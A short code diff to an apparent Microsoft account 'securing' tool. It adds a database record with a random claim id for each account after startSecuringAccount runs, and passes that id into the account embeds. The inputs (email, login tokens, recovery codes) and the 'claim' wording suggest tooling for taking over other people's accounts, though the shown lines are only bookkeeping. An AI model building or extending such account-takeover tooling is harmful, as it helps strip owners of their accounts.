@@ -4,7 +4,9 @@ from securing.auth.initial_session import get_session
 from securing.utils.polish_host import polish_host
 from securing.auth.get_msaauth import get_msaauth
 from securing.utils.secure import secure
+from database.database import DBConnection
 import httpx
+import uuid
 import time
 
 async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True, ppft: str = None, rextra: dict = None):
@@ -80,5 +82,9 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
 
     finalTime = (time.time() - initialTime)
 
-    account = await build_account_embeds(account, finalTime)
+    claim_id = uuid.uuid4().hex
+    with DBConnection() as db:
+        db.add_secured_account(claim_id, account)
+
+    account = await build_account_embeds(account, finalTime, claim_id)
     return account
